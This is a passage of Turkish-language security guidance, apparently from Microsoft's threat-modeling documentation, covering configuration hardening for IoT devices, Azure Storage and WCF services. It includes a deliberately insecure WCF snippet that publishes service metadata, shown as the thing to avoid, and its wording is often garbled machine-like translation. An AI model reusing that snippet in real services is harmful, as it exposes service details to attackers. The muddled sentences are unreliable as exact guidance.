| **Adımları** | Yapılandırma dosyaları gibi Web.config appsettings.json genellikle kullanıcı adları, parolalar, veritabanı bağlantı dizelerini ve şifreleme anahtarları gibi hassas bilgileri tutmak için kullanılır. Bu bilgi koruma değil, saldırganların veya kötü amaçlı kullanıcıların hesap kullanıcı adları ve parolalar, veritabanı adları ve sunucu adları gibi hassas bilgileri almak için uygulamanızı savunmasızdır. Dağıtım türüne (azure/şirket içi) göre yapılandırma dosyaları DPAPI veya Azure anahtar kasası gibi hizmetleri kullanarak önemli bölümlerini şifreler. |

## <a id="admin-strong"></a>Tüm yönetim arabirimleri ile güçlü kimlik bilgileri güvenli olduğundan emin olmak

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | Cihaz veya alan ağ geçidi sunan tüm yönetim arabirimlerini güçlü kimlik bilgileri kullanılarak güvenli hale getirilmelidir. Ayrıca, Wi-Fi, SSH herhangi diğer arabirimleri ister, dosya paylaşımları, FTP güçlü kimlik bilgileri ile güvenli hale getirilmelidir. Varsayılan zayıf parolalarda kullanılmamalıdır. |

## <a id="unknown-exe"></a>Bilinmeyen kod cihazlarda yürütülemiyor emin olun.

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [Güvenli Önyükleme ve Windows 10 IoT Core bit locker cihaz şifrelemesini etkinleştirme](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Adımları** | UEFI Güvenli Önyükleme, sistem ikili dosyalarının belirtilen bir yetkilisi tarafından imzalanmış yürütülmesine yalnızca kısıtlar. Bu özellik bilinmeyen kod platformu üzerinde yürütülen ve olası güvenlik duruşunu zayıflatmanın engeller. UEFI güvenli önyüklemeyi etkinleştirmeniz ve kod imzalama için güvenilen sertifika yetkililerinin listesini sınırlayabilirsiniz. Güvenilen yetkilileri birini kullanarak cihaza dağıtılan tüm kod oturum açın. |

## <a id="partition-iot"></a>İşletim sistemi ve ek IOT cihaz bölümlerle bit locker şifrele

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | Windows 10 IoT Core hafif bir sürümüdür ve güçlü bir bağımlılık gerekli ölçümleri yapmaktadır UEFI'de belirtilen gerekli preOS Protokolü dahil olmak üzere platformunda TPM varlığına sahip bit locker cihaz şifreleme uygular. Bu preOS ölçümler, işletim Sisteminin daha sonra işletim sistemini nasıl başlatıldı kesin kaydını olduğundan emin olun. Hassas verileri depoladıkları durumunda bit locker ve hiçbir ek bölüm ayrıca kullanarak işletim sistemi bölümleri şifreleyin. |

## <a id="min-enable"></a>Yalnızca en düşük/özelliklerin cihazlarda etkinleştirildiğinden emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | Etkinleştirmeyin veya herhangi bir özellik veya çözümün çalışması için gerekli olmayan işletim sistemi hizmetleri devre dışı bırakın. İçin örneğin cihaz dağıtılması bir kullanıcı Arabirimi gerektirmiyorsa gözetimsiz modunda Windows IOT Core yükleyin. |

## <a id="field-bit-locker"></a>İşletim sistemi ve ek IOT alan ağ geçidi bölümlerle bit locker şifrele

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IOT alan ağ geçidi | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | Windows 10 IoT Core hafif bir sürümüdür ve güçlü bir bağımlılık gerekli ölçümleri yapmaktadır UEFI'de belirtilen gerekli preOS Protokolü dahil olmak üzere platformunda TPM varlığına sahip bit locker cihaz şifreleme uygular. Bu preOS ölçümler, işletim Sisteminin daha sonra işletim sistemini nasıl başlatıldı kesin kaydını olduğundan emin olun. Hassas verileri depoladıkları durumunda bit locker ve hiçbir ek bölüm ayrıca kullanarak işletim sistemi bölümleri şifreleyin. |

## <a id="default-change"></a>Varsayılan oturum açma kimlik bilgilerini alan ağ geçidi yüklemesi sırasında değiştirildiğinden emin olun.

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IOT alan ağ geçidi | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | Varsayılan oturum açma kimlik bilgilerini alan ağ geçidi yüklemesi sırasında değiştirildiğinden emin olun. |

## <a id="cloud-firmware"></a>Bulut ağ geçidine bağlı cihazların üretici yazılımı güncel tutmak için bir işlem gerçekleştirdiğinden emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IOT bulut ağ geçidi | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Ağ geçidi seçim - Azure IOT hub'ı |
| **Başvuruları**              | [IOT Hub cihaz yönetimine genel bakış](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [cihaz üretici yazılımını güncelleştirme](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Adımları** | LWM2M IOT cihaz yönetimi için Open Mobile Alliance gelen bir protokoldür. Cihaz görevlerini kullanarak fiziksel cihazlar ile etkileşim kurmak için Azure IOT cihaz yönetimi sağlar. Bulut ağ geçidi düzenli olarak cihaz ve diğer yapılandırma verilerini Azure IOT Hub cihaz yönetimini kullanarak güncel tutmak için bir işlem gerçekleştirdiğinden emin olun. |

## <a id="controls-policies"></a>Cihazları kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Makine güven sınırı | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | Yok  |
| **Adımları** | Cihazları son nokta güvenlik denetimleri bit locker disk düzeyinde şifreleme, güncelleştirilmiş imzalarla virüsten koruma gibi ana bilgisayar tabanlı güvenlik duvarı, işletim sistemi yükseltmelerini vb. Kurumsal güvenlik ilkeleri göre yapılandırılmış ilkeler Grup emin olun. |

## <a id="secure-keys"></a>Azure depolama erişim anahtarlarını güvenli Yönetimi emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Azure Storage | 
| **SDL aşaması**               | Dağıtım |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [Azure depolama Güvenlik Kılavuzu - bilgisayarınızı depolama hesabı anahtarlarını yönetme](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Adımları** | <p>Anahtar depolama alanı: Azure Key Vault'a gizli dizi olarak Azure depolama erişim anahtarlarını depolar ve anahtarı anahtar kasasından almak uygulamanız önerilir. Bunun nedeni şunlar önerilir:</p><ul><li>Uygulamayı kaldırır. Cadde birisi belirli bir izni olmadan anahtarlarına erişim sağlama, konusu No: bir yapılandırma dosyasında depolama anahtarı sabit kodlanmış hiçbir zaman sahip olmayacak</li><li>Azure Active Directory'yi kullanarak anahtarlarına erişim denetlenebilir. Başka bir deyişle, bir hesap sahibi birkaç Azure Key Vault'tan anahtarları almak için gereken uygulamalar için erişim verebilirsiniz. Diğer uygulamalara izin özellikle vermeden için bunları anahtarlarına erişmek mümkün olmayacaktır</li><li>Anahtarı yeniden oluşturma: Güvenlik nedenleriyle Azure depolama erişim anahtarlarını yeniden yerinde bir süreç kullanmanız önerilir. Ayrıntıları neden ve nasıl yeniden anahtar oluşturma işlemi için planlama Azure depolama Güvenlik Kılavuzu başvuru makalesinde belirtilmiştir</li></ul>|

## <a id="cors-storage"></a>Azure depolama alanında CORS etkinse, yalnızca güvenilir kaynaklara izin verildiğinden emin olun

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Azure Storage | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [Azure Storage Hizmetleri için CORS desteği](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Adımları** | Azure depolama, CORS – arası kaynak paylaşımı kaynak etkinleştirmenize izin verir. Her Depolama hesabı için bu depolama hesabındaki kaynaklara erişebilen bir etki alanı belirtebilirsiniz. Varsayılan olarak, CORS tüm hizmetleri devre dışıdır. CORS hizmeti ilkeleri ayarlamak için yöntemlerden birini çağırmak için REST API veya depolama istemci kitaplığı kullanarak etkinleştirebilirsiniz. |

## <a id="throttling"></a>WCF'ın hizmet azaltma özelliğini etkinleştir

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | WCF | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | .NET Framework 3 |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Krallık Fortify](https://vulncat.fortify.com) |
| **Adımları** | <p>Bir sınır üzerinde sistem kaynaklarının kullanımını yerleştirme değil, Kaynak Tükenmesi ve sonuç olarak hizmet reddine neden olabilir.</p><ul><li>**AÇIKLAMA:** Windows Communication Foundation (WCF) hizmet istekleri azaltma olanağı da sunar. Çok sayıda istemci isteklerine izin verme, bir sistem doldurmak ve kaynaklarını tüketebilir. Öte yandan, yalnızca az sayıda hizmet isteklerine izin verme kullanıcıların hizmet kullanılmasını önleyebilir. Her hizmet ayrı ayrı şekilde ve uygun kaynakların miktarına izin verecek şekilde yapılandırılmış gerekir.</li><li>**Öneriler** etkinleştirme WCF'ın Hizmeti azaltma özelliğini ve kümesi sınırları, uygulamanız için uygun.</li></ul>|

### <a name="example"></a>Örnek
Azaltma etkinleştirildi ile örnek bir yapılandırma verilmiştir:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Meta verileri üzerinden WCF bilgilerin açıklanması

| Unvan                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | WCF | 
| **SDL aşaması**               | Oluşturma |  
| **İlgili teknolojiler** | .NET Framework 3 |
| **Öznitelikler**              | Yok  |
| **Başvuruları**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Krallık Fortify](https://vulncat.fortify.com) |
| **Adımları** | Meta veri, sistem hakkında bilgi edinin ve saldırı biçiminin planı saldırganlar yardımcı olabilir. WCF hizmetleri meta verileri kullanıma sunmak için yapılandırılabilir. Meta verileri ayrıntılı hizmet açıklaması bilgilerini sağlar ve üretim ortamlarında yayınlamamak. `HttpGetEnabled`  /  `HttpsGetEnabled` ServiceMetaData sınıf özelliklerini tanımlayan hizmet meta verileri açığa çıkarır | 

### <a name="example"></a>Örnek
Aşağıdaki kod bir hizmet meta verilerini yayınlamak için WCF bildirir
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Hizmet meta verileri bir üretim ortamında yayın değil. De ayarlama / sınıf ServiceMetaData de özellikleri için false. 

### <a name="example"></a>Örnek
Aşağıdaki kod, bir hizmetin meta verileri yayınlamamak için WCF bildirir. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
